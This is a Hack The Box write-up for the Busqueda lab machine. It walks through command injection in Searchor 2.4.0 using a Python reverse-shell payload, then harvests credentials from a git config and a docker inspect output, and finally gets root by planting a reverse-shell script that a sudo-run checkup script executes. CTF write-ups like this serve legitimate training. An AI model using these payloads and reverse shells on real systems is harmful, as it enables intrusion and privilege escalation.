# Busqueda HTB machine

** A machine with a web service that uses a vulnerable python library for generating search queries. **

- After exploring the web page, we can find information about the website. As it is stated at the bottom of the page "Powered by Flask and Searchor 2.4.0". After gathering information about Searchor 2.4.0, we found out that it is vulnerable to Arbitrary Code Execution(CWE-94), as stated in the following article:

https://security.snyk.io/vuln/SNYK-PYTHON-SEARCHOR-3166303

We can find the exploit of Searchor 2.4.0 in the following github link:

https://github.com/jonnyzar/POC-Searchor-2.4.2

Let's inject a reverse shell into the website "What do you want to search for:" field, using the following code:

```
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.16.54',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```

Before sending the payload, make sure to execute "nc -lvpn 4444" with your terminal and change your ip with the one you have.

After sending the payload, we have user access as user "svc". We can now obtain the user flag. After examinating the structure of the server, we find a useful configuration file in the "/var/www/" folder which is a common directory found in Linux-based operating systems, typically used for storing web content. We can use the following command to locate files that have "config" as a substring of their name:

```
find /var/www/ -type f -iname "*config*" 2>/dev/null
```

The output is "/var/www/app/.git/config". We can perform "cat /var/www/app/.git/config" to view the file. We can see the following line in the file that provides credentials and a subdomain of the website called gitea.searcher.htb. 

```
url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
```

This article explains how git credentials are stored in configuration files.

https://www.shellhacks.com/git-config-username-password-store-credentials/


We can try using the password as the password for the "svc" user to ssh to the machine and achieve connection. By executing "ssh svc@10.10.11.208" and providing the password "jh1usoih2bkjaspwe92" we can achieve connection.

Let's see the root permissions of the "svc" user to check if we can achieve privilege escalation by any means. After executing "sudo -l" we get the following message:

```
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Executing the command "sudo /usr/bin/python3 /opt/scripts/system-checkup.py *" we get the following help message:

```
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

Executing "sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps" will list all running docker containers and the id associated with each docker container.

Executing "sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect" will generate the following help message:

```
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```

From this docker website we can find the correct format to inspect a certain docker container.

By getting the container id from the previous steps, we can find information about the docker container by executing the following command:

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' 960873171e2e
```

From the output of the command, we get a line that contains a password value for the git database at the gitea.searcher.htb subdomain.

```
"GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh”
```

Add the gitea.searcher.htb subdomain to the /etc/hosts folder, then load the page and go to the "sign in" page. After trying the usernames presented in the output of the previous command, we need to find the correct username. We can try to sign-in as "cody" and password "jh1usoih2bkjaspwe92" as we discovered previously. We can see that in the dashboard there is a user named "administrator". Let's try use "administrator" as username and password "yuiu1hoiu4i5ho1uh". We now successfully logged in as "administrator" and we can find a private folder named "scripts" and view the scripts used in the server associated with the command "/usr/bin/python3 /opt/scripts/system-checkup.py *". After examinating the scripts, we find a vulnerability in the script "system-checkup.py" in the following block:

```
elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
```

This block executes a command specified in the arg_list list by calling the run_command() function. If the execution is successful, it prints the output and a "Done!" message. However, if an exception occurs during the execution, it prints a generic "Something went wrong" message and exits with a non-zero status code.

The code relies on the run_command() function to execute the command specified in arg_list. The security and vulnerability of this code depend on how the run_command() function is implemented. If the function does not properly validate or sanitize the input, it may be susceptible to command injection attacks.

Let's try creating a script named "full-checkup.sh" in the directory "/home/svc" for the necessary permissions. We can execute "touch full-checkup.sh" and then use "vi" editor to create the file. Paste the following reverse shell code with appropriate ip and port numbers:

```
#!/usr/bin/python3
import socket
import subprocess
import os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.54",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("sh")
```

Now save the script and execute "chmod +x full-checkup.sh" to make it executable. Execute "nc -lvpn 4444" in your terminal to listen for incoming requests. Now, execute the script on the machine with the following command:

```
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

Congrats! We connected to the machine as "root" user and we can display the root flag under the "/root" directory.
